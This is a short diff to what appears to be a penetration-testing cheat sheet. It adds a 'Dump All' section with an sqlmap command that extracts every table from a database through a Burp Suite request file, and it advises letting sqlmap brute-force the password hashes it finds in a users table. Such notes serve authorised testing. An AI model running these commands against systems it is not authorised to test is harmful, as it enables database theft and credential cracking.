@@ -23,6 +23,16 @@ sqlmap -r <txt file from burpsuite> -D <database name> --dump
 sqlmap -r <txt file from burpsuite> -D <database name> --tables -T users
 ````
 
+**Dump All**
+
+if you use for example:
+
+````
+sqlmap -r <burpsuite txt file> -D <ddbb> -T <table> --dump-all
+````
+And the case is if the table is the users table, with dump all sqlmap will ask to bruteforce the hashes, should be YES.
+
+
 --------------------------------
 **Lateral Movement**
 
